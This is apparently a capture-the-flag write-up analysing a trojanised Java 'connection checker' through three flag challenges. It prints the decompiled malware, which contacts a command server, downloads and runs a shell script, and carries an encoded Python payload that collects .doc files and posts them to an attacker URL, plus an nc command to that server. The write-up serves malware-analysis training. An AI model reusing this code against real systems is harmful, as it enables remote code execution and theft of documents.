# Connection Checker

## \[★☆☆\] Tool

### Description

Bob, the overworked system administrator, had always battled an unpredictable internet connection—one moment it’s there, the next it’s gone. In his search for a remedy, he stumbled upon a forum post by a genuinely good guy, a friendly coder who had whipped up a quirky little program designed to diagnose his connectivity woes. With a mix of hope and skepticism, Bob ran the tool, only to be met with an eerie silence. At least it seemed so.

[CheckConnection.jar](https://ctf-world.cybergame.sk/files/f1b1b07f9fe65232435354c6fbf169e0/CheckConnection.jar?token=eyJ1c2VyX2lkIjoyOTQsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjEyfQ.aBe_mQ.sK6Eg7zz2adh7H23oNYSRDcRZ38 "CheckConnection.jar")

### Solution

Decompile the JAR file [https://www.decompiler.com/jar/1733171726a0461f8765cd649f5516ce/CheckConnection.jar](https://www.decompiler.com/jar/1733171726a0461f8765cd649f5516ce/CheckConnection.jar)

Main file to focus right now is `TestKt.java`. Right off the bat we see first base64 encoded value, if decoded it's the first flag.
```java
      String start_token = "U0stQ0VSVHtqNHJfZDNjMG1wX2s3fQ==";
```

> Flag: `SK-CERT{j4r_d3c0mp_k7}`

## \[★☆☆\] Lies

### Description

It turns out Bob wasn’t lucky after all. This tool isn’t a helpful diagnostic. Can you reveal its true purpose?

### Solution

After following some logic we see another obfuscated used

![ConnectionChecker.png](/assets/ctf/cybergame/connectionchecker.png)

deobfuscate by running the code and get second flag

```java
// https://www.programiz.com/java-programming/online-compiler/
class Main {
    public static void main(String[] args) {
       byte[] s = new byte[]{-67, -33, 90, 3, -3, -61, -71, 35, 109, 78, 37, -109, 113, 90, 65, -109, -99, 66, 90, 66, 65, 83, 66, 79, 53}; 

       for(int m = 0; m < s.length; m++) {
          int c = s[m] & 255;
          c ^= m;
          c = c - 10 & 255;
          c = -c & 255;
          c = c + m & 255;
          c = (c >> 2 | c << 6) & 255;
          s[m] = (byte)c;
          System.out.print((char)c);
       }
    }
}
```

> Flag: `SK-CERT{k3y_f0r_c253rv3r}`

## \[★☆☆\] Executer

### Description

It seems that this "tool" is executing a payload. Can you determine what it does?

### Solution

Following piece of code is connecting to C2 server
```java
String serverIp = "195.168.112.4";
int serverPort = 7051;
String ssid = getCurrentSSID();
String ip =  getLocalIp();
String combined = ssid + '|' + ip;
String hash = md5(combined);
if (Intrinsics.areEqual((Object)hash, (Object)"de2ca7388ab6efb59a977505b9414ca2")) {
   try {
      Socket socket = new Socket(serverIp, serverPort);
      PrintWriter output = new PrintWriter(socket.getOutputStream(), true);
      BufferedReader input = new BufferedReader((Reader)(new InputStreamReader(socket.getInputStream())));
      String encodedData = base64(hash + '|' + new String(s, Charsets.UTF_8));
      output.println(encodedData); 
      String response = input.readLine();
      File tmpFile = File.createTempFile("tempScript", ".sh");
      try {
         FilesKt.writeText(tmpFile, response, (Charset)null, 2, (Object)null);
         tmpFile.setExecutable(true);
         Process process = Runtime.getRuntime().exec(tmpFile.getAbsolutePath());
         int var17 = process.waitFor();
      } finally {
         tmpFile.delete();
      }

      input.close();
      output.close();
      socket.close();
   } catch (IOException var21) {
   }
}
```

`output.println(encodedData);` sends the message to C2 server and then `String response = input.readLine();` reads the response. 

Encoded data is just `String encodedData = base64(hash + '|' + new String(s, Charsets.UTF_8));`; Hash is already hardcoded so we know it, `s` is the second flag and finally base64 encode;

```powershell
➜ (Get-Command be).ScriptBlock
param($plaintext)
 [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($plaintext))

➜ be 'de2ca7388ab6efb59a977505b9414ca2|SK-CERT{k3y_f0r_c253rv3r}'
ZGUyY2E3Mzg4YWI2ZWZiNTlhOTc3NTA1Yjk0MTRjYTJ8U0stQ0VSVHtrM3lfZjByX2MyNTNydjNyfQ==

➜ echo 'ZGUyY2E3Mzg4YWI2ZWZiNTlhOTc3NTA1Yjk0MTRjYTJ8U0stQ0VSVHtrM3lfZjByX2MyNTNydjNyfQ==' | nc 195.168.112.4 7051 | tee -FilePath script.sh
/usr/bin/python3 -c "import base64, marshal, sys; exec(marshal.loads(base64.b64decode('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')[(16 if sys.version_info >= (3,7) else 8):]), globals())"
```

Get readable code
```python
import base64, marshal, sys, dis

payload = 'pw0NCgA...GXIRAAAA'
b64_decoded = base64.b64decode(payload)
marshal_decoded = marshal.loads(b64_decoded[(16 if sys.version_info >= (3,7) else 8):])
dis.dis(marshal_decoded)
```

Use ChatGPT to reverse engineer without struggle
```python
import os
import base64
import requests

def s(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.lower().endswith('.doc'):
                full_path = os.path.join(root, file)
                try:
                    with open(full_path, 'rb') as f:
                        f = {
                            'file': file,
                            # Deobfuscated and executed code will go here
                        }
                        exec(''.join(
                            chr(b ^ ord("UIGioepxhWnwGIOK"[i % len("UIGioepxhWnwGIOK")]))
                            for i, b in enumerate(
                                base64.b64decode(
                                    "IGl6SU0NBAwYbUFYJj07KjYiIhtBBBQcGjIdBGglKio+FiEAAwBTKyN6LTIVHTQ7LH4vWQE6AEwRO15DIzRt"
                                )
                            )
                        ), globals())
                        response = requests.post(u, files=f)
                except Exception:
                    pass

if __name__ == '__main__':
    directory = '.'
    s(directory)
```

Replace `exec` with `print`
```python
import base64

print(''.join(
    chr(b ^ ord("UIGioepxhWnwGIOK"[i % len("UIGioepxhWnwGIOK")]))
    for i, b in enumerate(
        base64.b64decode(
            "IGl6SU0NBAwYbUFYJj07KjYiIhtBBBQcGjIdBGglKio+FiEAAwBTKyN6LTIVHTQ7LH4vWQE6AEwRO15DIzRt"
        )
    )
))

# u = "http://attacker.address/leak_file#SK-CERT{py7h0n_p4yl04d}"
```

> Flag: `SK-CERT{py7h0n_p4yl04d}`

